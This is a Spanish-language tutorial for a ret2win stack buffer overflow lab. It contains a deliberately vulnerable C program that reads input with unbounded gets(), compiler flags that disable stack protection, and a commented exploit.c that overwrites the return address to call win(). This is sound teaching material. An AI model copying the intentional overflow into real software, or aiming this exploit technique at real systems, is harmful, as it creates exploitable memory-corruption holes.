``` c
// vuln.c
#include <stdio.h>
#include <string.h>

void win() {
    puts("has ganado!");
}

int main() {
    char buffer[64];
    gets(buffer);   // sin limite
    return 0;
}

```

compilacion:

``` bash

gcc vuln.c -o vuln -fno-stack-protector -no-pie -m32 -Wno-implicit-function-declaration

```

conseguir direccion en memoria de la funcion wins():

``` bash

objdump -d vuln | grep win

```

``` bash

gcc exploit.c -o exploit -m32

```

``` c

// exploit.c

// stdio.h nos da: printf, fwrite, puts
// string.h nos da: memset, memcpy
// unistd.h nos da: pipe, fork, dup2, execv, write, close
// stdlib.h nos da: exit
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// #define es una constante — el compilador sustituye WIN_ADDR
// por este número en todo el código antes de compilar.
// Esta dirección la sacas con: objdump -d vuln | grep win
#define WIN_ADDR 0x08049172

int main() {

    // pipe() crea dos extremos de un tubo de comunicación:
    // fds[0] = extremo de lectura  (quien recibe datos)
    // fds[1] = extremo de escritura (quien envía datos)
    int fds[2];
    pipe(fds);

    // fork() divide el proceso en dos:
    // - en el proceso hijo  devuelve 0
    // - en el proceso padre devuelve el PID del hijo
    // A partir de aquí hay DOS procesos ejecutando este código
    pid_t pid = fork();

    if (pid == 0) {
        // --- PROCESO HIJO: va a ejecutar ./vuln ---

        // dup2 duplica un file descriptor.
        // Aquí hacemos que el stdin (fd 0) del hijo
        // sea el extremo de lectura del pipe.
        // Cuando vuln llame a gets(), leerá del pipe.
        dup2(fds[0], 0);

        // Cerramos los dos extremos del pipe en el hijo
        // porque ya no los necesitamos directamente
        close(fds[0]);
        close(fds[1]);

        // execv reemplaza este proceso por ./vuln
        // El hijo deja de ser exploit.c y pasa a ser vuln
        // El array argv termina siempre en NULL
        char *args[] = { "./vuln", NULL };
        execv("./vuln", args);

        // Si execv falla (por ejemplo, vuln no existe)
        // llegamos aquí y avisamos
        perror("execv fallo");
        exit(1);
    }

    // --- PROCESO PADRE: construye y envía el payload ---

    // Cerramos el extremo de lectura en el padre
    // porque el padre solo va a escribir, no leer
    close(fds[0]);

    // Declaramos el array de bytes que será nuestro payload
    // 72 bytes: 64 buffer + 4 saved EBP + 4 EIP
    unsigned char payload[72];

    // memset rellena un bloque de memoria con un valor.
    // Aquí ponemos 'A' (0x41) en los primeros 68 bytes:
    // 64 bytes del buffer + 4 del saved EBP
    memset(payload, 'A', 68);

    // Sobreescribimos los últimos 4 bytes con WIN_ADDR
    // Lo escribimos en little-endian: byte menos significativo primero
    // >> desplaza bits a la derecha, & 0xFF coge solo el último byte
    payload[68] = (WIN_ADDR >> 0)  & 0xFF;  // byte 1 (menos significativo)
    payload[69] = (WIN_ADDR >> 8)  & 0xFF;  // byte 2
    payload[70] = (WIN_ADDR >> 16) & 0xFF;  // byte 3
    payload[71] = (WIN_ADDR >> 24) & 0xFF;  // byte 4 (más significativo)

    // write escribe los 72 bytes del payload
    // en el extremo de escritura del pipe (fds[1])
    // El hijo (vuln) lo recibirá por su stdin
    write(fds[1], payload, 72);

    // Cerramos el extremo de escritura del padre
    // Esto le indica al hijo que no hay más datos (EOF)
    // Sin este close, gets() se quedaría esperando para siempre
    close(fds[1]);

    // wait hace que el padre espere a que el hijo termine
    // Sin esto, el padre podría salir antes que vuln imprima nada
    wait(NULL);

    return 0;
}

```
